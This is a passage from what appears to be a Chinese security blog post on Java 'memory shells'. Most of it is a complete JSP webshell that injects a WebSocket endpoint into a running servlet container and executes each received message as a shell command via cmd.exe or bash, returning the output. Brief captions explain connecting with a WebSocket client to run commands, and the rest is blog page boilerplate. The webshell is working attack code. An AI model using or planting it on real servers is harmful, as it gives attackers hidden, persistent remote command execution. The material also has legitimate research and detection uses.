+&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;
+
+&lt;%!
+    public static class WebSocketDemo extends Endpoint implements MessageHandler.Whole&lt;String&gt; &#123;
+        private Session session;
+        @Override
+        public void onOpen(Session session, EndpointConfig config) &#123;
+            this.session &#x3D; session;
+            session.addMessageHandler(this);
+        &#125;
+
+        @Override
+        public void onMessage(String str) &#123;
+            try &#123;
+                Process process;
+                boolean bool &#x3D; System.getProperty(&quot;os.name&quot;).toLowerCase().startsWith(&quot;Windows&quot;);
+                if (bool) &#123;
+                    process &#x3D; Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;,&quot;&#x2F;c&quot;,str&#125;);
+                &#125; else &#123;
+                    process &#x3D; Runtime.getRuntime().exec(new String[]&#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,str&#125;);
+                &#125;
+                InputStream inputStream &#x3D; process.getInputStream();
+                StringBuilder stringBuilder &#x3D; new StringBuilder();
+                int i;
+                while ((i &#x3D; inputStream.read()) !&#x3D; -1)
+                    stringBuilder.append((char)i);
+                inputStream.close();
+                process.waitFor();
+                session.getBasicRemote().sendText(stringBuilder.toString());
+            &#125; catch (Exception exception) &#123;
+                exception.printStackTrace();
+            &#125;
+        &#125;
+    &#125;
+%&gt;
+&lt;%
+    String path &#x3D; request.getParameter(&quot;path&quot;);
+    ServletContext servletContext &#x3D; request.getServletContext();
+    ServerEndpointConfig serverEndpointConfig &#x3D; ServerEndpointConfig.Builder.create(WebSocketDemo.class, path).build();
+    ServerContainer serverContainer &#x3D; (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
+    serverContainer.addEndpoint(serverEndpointConfig);
+    out.println(&quot;Inject Success! Connect URL Path: &quot; + servletContext.getContextPath() + path);
+%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925130218457.png" alt="image-20230925130218457"></p>
+<p>指定WebSocket访问路径后添加到端点</p>
+<p><img src="/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925130318290.png" alt="image-20230925130318290"></p>
+<p><img src="/images/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230925130442587.png" alt="image-20230925130442587"></p>
+<p>使用WebSocket客户端连接工具连接即可执行命令</p>
+
+    </div>
+    
+    <div class="post__license">
+        <p>
+            <strong>Author: </strong>wileysec
+        </p>
+        <p>
+            <strong>
+                Permalink: 
+            </strong>
+            <a href="https://wileysec.github.io/fee784a451d7.html">https://wileysec.github.io/fee784a451d7.html</a>
+        </p>
+        
+    </div>
+ 
+    <div class="post-footer__meta"><p>文章更新于 2023-09-25</p></div> 
+    <div class="post-entry__tags"><a href="/tags/Java%E5%AE%89%E5%85%A8/" class="post-tags__link button"># Java安全</a><a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" class="post-tags__link button"># 内存马</a><a href="/tags/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC/" class="post-tags__link button"># WebSocket内存马</a></div> 
+</article>
+
+
+    <div class="nav">
+        <div class="nav__prev">
+            
+        </div>
+        <div class="nav__next">
+            
+                <a href="/c92b2696b98a.html" class="nav__link">
+                    <div>
+                        <div class="nav__label">
+                            Next Post
+                        </div>
+                        <div class="nav__title">
+                            Java内存马-Agent内存马分析与实现
+                        </div>
+                    </div>
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M434.944 790.624l-45.248-45.248L623.04 512l-233.376-233.376 45.248-45.248L713.568 512z" fill="#808080"></path></svg>
+                    </div>
+                </a>
+            
+        </div>
+    </div>
+
+
+
+    <div class="post__comments post__with-toc content-card" id="comment">
+        
+    <h4>Comments</h4>
+    
+    
+    
+    <div id="valine_container" class="valine_thread"></div>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+    </div>
+
+
+
+</main>
+
+            <footer class="footer">
+     
+    <a href="#" class="button" id="b2t" aria-label="Back to Top" title="Back to Top">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="32" height="32">
+            <path d="M233.376 722.752L278.624 768 512 534.624 745.376 768l45.248-45.248L512 444.128zM192 352h640V288H192z" fill="currentColor"></path>
+        </svg>
+    </a>
+
+    
+
+
+    
+     
+ 
+
+ 
+    
+        
+        <p class="footer-copyright">
+            Copyright © 2023 <a href="/">Wileysec&#39;s Blog</a>
+        </p>
+    
+    
+    <p><a href="https://beian.miit.gov.cn/" target="_blank">皖ICP备18006273号-1</a></p>
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/ChrAlpha/hexo-theme-cards" target="_blank">Cards</a></p>
+    <p></p>
+</footer>
+
+        </div>
+         
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+ 
+
+
+
+ 
+
+
+    
+ 
+
+
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.css">
+
+    
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.js"></script>
+
+    <script>
+        let lazyloadT = Boolean('false'),
+            auto_fancybox = Boolean('false')
+        if (auto_fancybox) {
+            $(".post__content").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        } else {
+            $(".post__content").find("fancybox").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        }
+    </script>
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+    
+
+    
+
+    
+    
+    <script>
+        function loadComment() {
+            let e;
+            (e = document.createElement("script")).src = 'https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js',
+            document.body.appendChild(e);
+            e.onload = () => {
+                var valineConfig = {"appId":"GwvNoIVYwbmwRKo2fr9bcJHp-gzGzoHsz","appKey":"9olsAGq7SGWYUVcmI5RDrXid","placeholder":"请佬们指正","path":null,"avatar":"wavatar","meta":["nick","mail","link"],"pageSize":10,"lang":["zh-CN","en","zh-TW"],"visitor":null,"highlight":null,"avatarForce":null,"recordIP":true,"serverURLs":null,"enableQQ":null,"requiredFields":["nick","mail"],"emojiCDN":null,"emojiMaps":null};
+                valineConfig.el = '#valine_container';
+                for (var i in valineConfig) {
+                    if (valineConfig[i] === null) delete valineConfig[i];
+                }
+                new Valine(valineConfig);
+            };
+        }
+    
+        var runningOnBrowser = typeof window !== "undefined";
+        var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
+        var supportsIntersectionObserver = runningOnBrowser && "IntersectionObserver" in window;
+    
+        setTimeout(function () {
+            if (!isBot && supportsIntersectionObserver) {
+                var comment_observer = new IntersectionObserver(function(entries) {
+                    if (entries[0].isIntersecting) {
+                        loadComment();
+                        comment_observer.disconnect();
+                    }
+                }, { threshold: [0] });
+                comment_observer.observe(document.getElementById('comment'));
+            } else {
+                loadComment();
+            }
+        }, 1);
+    </script>
+
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+
+
+
+    </body>
+</html>
